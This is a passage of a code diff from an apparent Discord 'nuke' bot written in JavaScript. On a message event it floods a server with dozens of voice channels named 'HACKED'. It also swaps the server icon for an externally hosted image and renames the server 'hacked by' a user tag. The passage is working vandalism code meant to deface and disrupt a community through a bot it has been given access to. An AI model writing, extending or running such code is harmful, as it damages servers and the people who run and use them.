         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
       });
             await msg.guild
-      .createChannel("MELIK AMA YIKIK OLANDAN ALAYIM#0061", {
+      .createChannel("HACKED", {
         type: "voice"
       })
       .then(chan => {
         chan.setUserLimit("1");
-      });                      ///null
+      });
                 await msg.guild
       .createChannel("▬▬▬▬▬▬▬", {
         type: "voice"
@@ -1255,6 +1158,97 @@ client.on("message", async msg => {
         chan.setUserLimit("1");
       });
     
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED xD", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })  ///hacked
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+        await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+            await msg.guild
+      .createChannel("HACKED", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });                      ///hacked
+                await msg.guild
+      .createChannel("▬▬▬▬▬▬▬", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("1");
+      });
+    
+ 
+ 
+
+ 
+
+
 
     await msg.guild.setIcon("https://hizliresim.com/zUSK3E");  //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
     await msg.guild.setName("hacked by melik ama yıkık olandan alayım#0061 "); //SUNUCUNUN ISMINI DEGISTIRIR
